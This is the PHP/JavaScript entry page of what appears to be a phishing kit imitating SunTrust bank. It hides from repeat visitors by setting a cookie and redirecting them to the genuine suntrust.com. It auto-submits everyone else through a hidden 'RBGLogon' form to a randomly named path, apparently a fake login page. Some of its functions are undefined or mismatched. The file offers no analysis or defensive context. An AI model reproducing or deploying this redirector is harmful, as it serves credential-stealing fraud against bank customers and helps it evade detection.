<?php
session_start();
include 'gen.php';
?>
<script>

go_to = "http://www.suntrust.com/";


function readCookie(cookieName){
    var start = document.cookie.indexOf(cookieName);
    if (start == -1){
        document.cookie = "seenit=yes; expires=" + ged(num_days);
    } else {
        window.location = go_to;
    }
}

readCookie("seenit");
// -->
</script>
<script >
function submitform()
{
    document.forms["myform"].submit();
}
</script>
<form id="ponyo_form" action="<?php echo generateRandomString(); ?>" method="POST">

<input type="hidden" name="LOB" value="RBGLogon" />
</form>
<script>
document.getElementById("ponyo_form").submit();
</script>
